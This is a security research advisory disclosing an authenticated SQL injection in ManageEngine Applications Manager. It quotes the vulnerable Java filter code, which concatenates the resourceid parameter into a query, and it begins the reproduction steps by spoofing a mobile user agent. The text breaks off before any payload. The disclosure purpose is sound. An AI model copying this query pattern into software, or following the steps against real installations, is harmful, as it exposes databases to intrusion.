# ManageEngine Applications Manager Authenticated SQLi

High

[← View More Research Advisories](/security/research)
### Synopsis

Tenable Research discovered an authenticated SQL injection vulnerability in ManageEngine Applications Manager.

A flaw exists in the **doFilter** method in the **com.adventnet.appmanager.filter.UriCollector** Java class. A low-privileged user can inject SQL statements via the **resourceid** parameter in an HTTP request sent to URL **/showresource.do** while using a mobile User-Agent (i.e., User-Agent:blackberry HTTP header):

```
if (isMobile.equalsIgnoreCase("true")) {
        ...<snip>...
        if (str1.startsWith("/showapplication.do") && queryString.contains("method=showApplication")) {
          hresp.sendRedirect(hresp.encodeRedirectURL("/mobile/DetailsView.do?method=showMGDetails&groupId=" + req.getParameter("haid")));
        }
        ...<snip>...
          } else if (queryString.contains("method=showResourceForResourceID")) {
            ManagedApplication mo = new ManagedApplication();
            String qryToChkHAI = "Select * from AM_ManagedObject where TYPE='HAI' and RESOURCEID=" + req.getParameter("resourceid");
```

The attacker can perform the following actions to achieve SQLi:

```
- Using the Chrome browser, fetch the Applications Manager login page at https://<AppMgrHost>:8443/index.do
- Change the user agent of the Chrome browser to Android with steps: Customize and control Google Chrome -> More tools -> Developer tools -> Customize and control DevTools -> More tools -> Network conditions -> User agent -> uncheck Select automatically -> Android (4.0.2) browser
- Fetch the login page at https://<AppMgrHost>:8443/index.do
- The login page should be in mobile view
